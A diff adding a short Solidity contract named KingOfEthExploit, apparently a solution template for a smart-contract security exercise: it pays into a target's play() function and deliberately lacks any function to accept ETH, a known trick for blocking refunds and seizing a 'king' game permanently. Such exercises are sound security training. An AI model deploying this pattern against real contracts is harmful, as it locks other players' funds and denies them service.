@@ -1,0 +1,21 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+interface IKingOfEth {
+    function play() external payable;
+}
+
+contract KingOfEthExploit {
+    IKingOfEth public target;
+
+    constructor(IKingOfEth _target) {
+        target = _target;
+    }
+    
+    // no fallback to accept ETH
+
+    function pwn() external payable {
+        // write your code here
+        target.play{value: msg.value}();
+    }
+}
